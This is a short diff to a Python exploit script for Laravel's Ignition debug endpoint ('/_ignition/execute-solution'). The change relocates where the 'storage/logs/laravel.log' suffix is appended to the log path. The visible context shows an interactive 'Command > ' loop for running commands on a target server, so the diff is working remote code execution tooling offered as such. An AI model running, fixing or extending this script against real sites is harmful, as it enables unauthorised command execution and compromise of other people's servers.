@@ -53,7 +53,7 @@ if __name__ == '__main__':
             try:
                 check = Exploit.getLogpath(target)
                 if check:
-                    args['path'] = check.replace(' ', '')
+                    args['path'] = check.replace(' ', '') + '/storage/logs/laravel.log'
                 else:
                     print(Color.red('Cannot find Logpath or No debug, please search manually.'))
                     sys.exit()
@@ -64,7 +64,7 @@ if __name__ == '__main__':
         readline.parse_and_bind('set editing-mode vi')
         exploit = Exploit()
         exploit.uri = f'{target}/_ignition/execute-solution'
-        exploit.logpath = args['path'] + '/storage/logs/laravel.log'
+        exploit.logpath = args['path']
         while True:
             command = input('Command > ')
             if command == 'exit':
